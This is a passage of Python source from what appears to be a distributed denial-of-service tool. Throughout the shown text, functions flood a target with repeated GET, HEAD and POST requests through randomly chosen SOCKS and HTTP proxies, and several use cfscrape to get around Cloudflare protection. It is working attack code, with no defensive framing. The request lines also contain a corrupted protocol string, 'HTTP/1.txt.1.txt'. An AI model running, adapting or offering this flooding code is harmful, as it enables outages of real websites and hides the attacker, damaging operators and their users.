            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def even(event, socks_type):
    global proxy
    proxy = Choice(proxies).strip().split(":")
    header = Headers("even")
    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def brust(event, socks_type):
    global proxy
    proxy = Choice(proxies).strip().split(":")
    header = Headers("brust")
    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cookie(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("cookie")
    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfb(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            cfscrape.create_scraper(sess=s)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


# def tor(event, socks_type):
# event.wait()
# while time.time() < timer:
# with tor_requests_session() as s:
# s.get(sys.argv[2])


def AVB(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    payload = str(random._urandom(64))
    while time.time() < timer:
        try:
            s = cfscrape.create_scraper()
            if socks_type == 5 or socks_type == 4:
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                for _ in range(multiple):
                    s.post(sys.argv[2], timeout=1, data=payload)
            except:
                s.close()
        except:
            s.close()


def bypass(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    payload = str(random._urandom(64))
    while time.time() < timer:
        try:
            s = requests.Session()
            if socks_type == 5 or socks_type == 4:
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                for _ in range(multiple):
                    s.post(sys.argv[2], timeout=1, data=payload)
            except:
                s.close()
        except:
            s.close()


def dgb(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = cfscrape.create_scraper()
            if socks_type == 5 or socks_type == 4:
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                sleep(5)
                for _ in range(multiple):
                    s.get(sys.argv[2])
            except:
                s.close()
        except:
            s.close()


def head(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("head")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def null(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def gsb(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("head")
    head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(5)
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def hit(event, timer):
    global s
    request = Headers("hit")
    event.wait()
    while time.time() < timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(target), int(port)))
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfbc(event, socks_type):
    request = Headers("cfb")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def post(event, socks_type):
    request = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def stress(event, socks_type):
    request = Headers("stress")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def ostress(event, timer):
    request = Headers("stress")
    event.wait()
    while time.time() < timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(target), int(port)))
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


socket_list = []
t = 0


def slow(conn, socks_type):
    header = Headers("dyn")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
